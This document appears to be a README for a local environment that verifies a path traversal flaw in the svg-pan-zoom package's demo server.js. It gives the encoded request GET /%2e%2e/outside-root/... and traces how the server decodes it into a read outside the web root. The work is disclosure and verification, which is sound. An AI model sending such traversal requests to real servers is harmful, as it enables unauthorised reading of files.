# svg-pan-zoom server.js Path Traversal Verification

This directory is a minimal verification environment for the `server.js` shipped by the `svg-pan-zoom` npm package.

The verification starts the real package server discovered through Node.js module resolution. It does not assume a fixed `node_modules` path and does not reimplement the vulnerable logic.

## Files

```text
verify_9_svg-pan-zoom/
  package.json
  verify.js
  start-server.js
  util-puts-shim.js
  outside-root/
    verify_9_parent_secret.txt
  server-root/
    public/
      hello.txt
```

`server-root/public/hello.txt` is the normal static file. It is inside the server working directory.

`outside-root/verify_9_parent_secret.txt` is the traversal target. It is still inside this verification directory, but intentionally outside `server-root`, which is the server working directory.

## Run

From this directory:

```bash
npm install
npm run verify
```

`npm install` installs the vulnerable package version declared in `package.json`. If `svg-pan-zoom` is already available from a parent workspace, Node.js can also resolve that installation.

The script starts the real `svg-pan-zoom/server.js` with the current server working directory set to `verify_9_svg-pan-zoom/server-root`.

The shim only restores the removed legacy `util.puts` logging function for modern Node.js versions. The package's `server.js` and its path handling logic are still the real installed package code.

To start the vulnerable server manually:

```bash
npm run server
```

The manual server uses port `3139` by default. You can pass another port:

```bash
npm run server -- 4000
```

## Expected Normal Case

Request:

```text
GET /public/hello.txt
```

Expected result:

```text
HTTP 200
NORMAL_STATIC_FILE_FROM_VERIFY_ROOT
```

This confirms the static server works for files inside the server root.

## Expected Vulnerability Case

Request:

```text
GET /%2e%2e/outside-root/verify_9_parent_secret.txt
```

`%2e%2e` is the URL-encoded form of `..`.

The vulnerable flow in `server.js` is:

```text
/%2e%2e/outside-root/verify_9_parent_secret.txt
  -> url.resolve keeps %2e%2e encoded
  -> /%(..)/g decodes %2e%2e to ..
  -> ./../outside-root/verify_9_parent_secret.txt
  -> fs.createReadStream reads a file outside the working directory
```

Expected result if vulnerable:

```text
HTTP 200
PARENT_SECRET_FOR_SVG_PAN_ZOOM_TRAVERSAL_VERIFY
```

## Impact

If `server.js` is started and an attacker can access its HTTP port, the attacker can request encoded parent-directory segments and read files outside the intended static directory, limited by the Node.js process permissions.

Normal frontend usage of `svg-pan-zoom`, such as importing `dist/svg-pan-zoom.js`, does not trigger this issue. The issue is in the development/demo static server.
